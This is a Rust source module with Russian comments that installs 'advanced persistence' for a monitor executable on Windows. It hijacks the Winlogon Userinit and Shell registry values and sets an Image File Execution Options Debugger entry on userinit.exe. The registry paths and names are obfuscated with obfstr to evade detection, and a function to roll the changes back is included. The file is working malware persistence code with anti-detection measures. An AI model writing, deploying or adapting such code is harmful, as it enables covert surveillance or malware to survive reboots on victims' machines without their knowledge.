// src/persistence_advanced.rs

use anyhow::{Result, anyhow};
use std::ptr;
use winapi::shared::minwindef::HKEY;
use winapi::shared::winerror::ERROR_SUCCESS;
use winapi::um::winnt::{KEY_READ, KEY_WRITE, KEY_WOW64_64KEY, REG_SZ, REG_EXPAND_SZ, LPCWSTR};
use winapi::um::winreg::{
    RegCreateKeyExW, RegOpenKeyExW, RegQueryValueExW, RegSetValueExW, RegCloseKey,
    RegDeleteValueW, HKEY_LOCAL_MACHINE,
};

// проверка прав через токен
fn is_admin() -> bool {
    use winapi::um::processthreadsapi::{GetCurrentProcess, OpenProcessToken};
    use winapi::um::securitybaseapi::GetTokenInformation;
    use winapi::um::handleapi::CloseHandle;
    use winapi::um::winnt::{TOKEN_QUERY, TokenElevation};

    unsafe {
        let mut token = ptr::null_mut();
        if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token) == 0 {
            return false;
        }
        let mut elevation = 0u32;
        let mut size = std::mem::size_of::<u32>() as u32;
        let ret = GetTokenInformation(
            token,
            TokenElevation,
            &mut elevation as *mut _ as *mut _,
            size,
            &mut size,
        );
        CloseHandle(token);
        ret != 0 && elevation != 0
    }
}

// читаем строку REG_SZ из реестра
fn read_reg_string(key: HKEY, subkey: &str, value_name: &str) -> Result<String> {
    let subkey_wide: Vec<u16> = subkey.encode_utf16().chain(Some(0)).collect();
    let value_wide: Vec<u16> = value_name.encode_utf16().chain(Some(0)).collect();

    let mut hkey = ptr::null_mut();
    let ret = unsafe {
        RegOpenKeyExW(
            key,
            subkey_wide.as_ptr() as LPCWSTR,
            0,
            KEY_READ | KEY_WOW64_64KEY,
            &mut hkey,
        )
    };
    if ret != ERROR_SUCCESS as i32 {
        return Err(anyhow!("Failed to open registry key"));
    }

    let mut data = vec![0u16; 4096];
    let mut data_len = (data.len() * 2) as u32;
    let mut typ = 0;
    let ret = unsafe {
        RegQueryValueExW(
            hkey,
            value_wide.as_ptr() as LPCWSTR,
            ptr::null_mut(),
            &mut typ,
            data.as_mut_ptr() as *mut _,
            &mut data_len,
        )
    };
    unsafe { RegCloseKey(hkey); }

    if ret != ERROR_SUCCESS as i32 {
        return Err(anyhow!("Failed to query registry value"));
    }
    if typ != REG_SZ && typ != REG_EXPAND_SZ {
        return Err(anyhow!("Registry value is not a string"));
    }
    let len = (data_len / 2) as usize;
    let string = String::from_utf16_lossy(&data[..len - 1]);
    Ok(string)
}

// пишем строку REG_SZ в реестр
fn write_reg_string(key: HKEY, subkey: &str, value_name: &str, value: &str) -> Result<()> {
    let subkey_wide: Vec<u16> = subkey.encode_utf16().chain(Some(0)).collect();
    let value_name_wide: Vec<u16> = value_name.encode_utf16().chain(Some(0)).collect();
    let value_wide: Vec<u16> = value.encode_utf16().chain(Some(0)).collect();

    let mut hkey = ptr::null_mut();
    let ret = unsafe {
        RegCreateKeyExW(
            key,
            subkey_wide.as_ptr() as LPCWSTR,
            0,
            ptr::null_mut(),
            0,
            KEY_WRITE | KEY_WOW64_64KEY,
            ptr::null_mut(),
            &mut hkey,
            ptr::null_mut(),
        )
    };
    if ret != ERROR_SUCCESS as i32 {
        return Err(anyhow!("Failed to create/open registry key"));
    }

    let ret = unsafe {
        RegSetValueExW(
            hkey,
            value_name_wide.as_ptr() as LPCWSTR,
            0,
            REG_SZ,
            value_wide.as_ptr() as *const u8,
            (value_wide.len() * 2) as u32,
        )
    };
    unsafe { RegCloseKey(hkey); }
    if ret != ERROR_SUCCESS as i32 {
        return Err(anyhow!("Failed to set registry value"));
    }
    Ok(())
}

// ставим расширенные методы автозапуска (нужны права)
pub fn install_advanced_persistence(monitor_exe_path: &str) -> Result<()> {
    if !is_admin() {
        return Err(anyhow!("Administrator rights required"));
    }

    let winlogon = obfstr::obfstr!("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon").to_string();
    let ifeo = obfstr::obfstr!("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\userinit.exe").to_string();

    // Userinit — дописываем наш путь через запятую
    let userinit_val = read_reg_string(HKEY_LOCAL_MACHINE, &winlogon, obfstr::obfstr!("Userinit"))?;
    if !userinit_val.contains(monitor_exe_path) {
        let new_val = format!("{}, {}", monitor_exe_path, userinit_val);
        write_reg_string(HKEY_LOCAL_MACHINE, &winlogon, obfstr::obfstr!("Userinit"), &new_val)?;
    }

    // Shell — оборачиваем, сохраняем оригинал
    let shell_orig = read_reg_string(HKEY_LOCAL_MACHINE, &winlogon, obfstr::obfstr!("Shell"))?;
    if !shell_orig.contains(monitor_exe_path) {
        write_reg_string(HKEY_LOCAL_MACHINE, &winlogon, obfstr::obfstr!("OriginalShell"), &shell_orig)?;
        let new_shell = format!("\"{}\" {}", monitor_exe_path, shell_orig);
        write_reg_string(HKEY_LOCAL_MACHINE, &winlogon, obfstr::obfstr!("Shell"), &new_shell)?;
    }

    // IFEO для userinit.exe через Debugger
    match read_reg_string(HKEY_LOCAL_MACHINE, &ifeo, obfstr::obfstr!("Debugger")) {
        Ok(v) if v.contains(monitor_exe_path) => {}
        _ => {
            write_reg_string(HKEY_LOCAL_MACHINE, &ifeo, obfstr::obfstr!("Debugger"), monitor_exe_path)?;
        }
    }

    Ok(())
}

// откат изменений при деинсталяции
pub fn restore_advanced_persistence() -> Result<()> {
    if !is_admin() {
        return Err(anyhow!("Administrator rights required"));
    }

    let winlogon = obfstr::obfstr!("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon").to_string();
    let ifeo = obfstr::obfstr!("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\userinit.exe").to_string();

    // убираем наш путь из Userinit
    let userinit_val = read_reg_string(HKEY_LOCAL_MACHINE, &winlogon, obfstr::obfstr!("Userinit"))?;
    let cleaned: Vec<&str> = userinit_val
        .split(',')
        .map(|s| s.trim())
        .filter(|s| !s.is_empty() && !s.contains("loader.exe") && !s.contains("monitor.exe"))
        .collect();
    let restored = cleaned.join(", ");
    if !restored.is_empty() {
        write_reg_string(HKEY_LOCAL_MACHINE, &winlogon, obfstr::obfstr!("Userinit"), &restored)?;
    }

    // восстанавливаем Shell из OriginalShell
    if let Ok(original) = read_reg_string(HKEY_LOCAL_MACHINE, &winlogon, obfstr::obfstr!("OriginalShell")) {
        write_reg_string(HKEY_LOCAL_MACHINE, &winlogon, obfstr::obfstr!("Shell"), &original)?;
        // удаляем OriginalShell
        let subkey_wide: Vec<u16> = winlogon.encode_utf16().chain(Some(0)).collect();
        let mut hkey = ptr::null_mut();
        unsafe {
            if RegOpenKeyExW(HKEY_LOCAL_MACHINE, subkey_wide.as_ptr() as LPCWSTR, 0, KEY_WRITE | KEY_WOW64_64KEY, &mut hkey) == ERROR_SUCCESS as i32 {
                let name = obfstr::obfstr!("OriginalShell").to_string();
                let name_wide: Vec<u16> = name.encode_utf16().chain(Some(0)).collect();
                RegDeleteValueW(hkey, name_wide.as_ptr() as LPCWSTR);
                RegCloseKey(hkey);
            }
        }
    }

    // убираем IFEO Debugger
    let subkey_wide: Vec<u16> = ifeo.encode_utf16().chain(Some(0)).collect();
    let mut hkey = ptr::null_mut();
    unsafe {
        if RegOpenKeyExW(HKEY_LOCAL_MACHINE, subkey_wide.as_ptr() as LPCWSTR, 0, KEY_WRITE | KEY_WOW64_64KEY, &mut hkey) == ERROR_SUCCESS as i32 {
            let name = obfstr::obfstr!("Debugger").to_string();
            let name_wide: Vec<u16> = name.encode_utf16().chain(Some(0)).collect();
            RegDeleteValueW(hkey, name_wide.as_ptr() as LPCWSTR);
            RegCloseKey(hkey);
        }
    }

    Ok(())
}
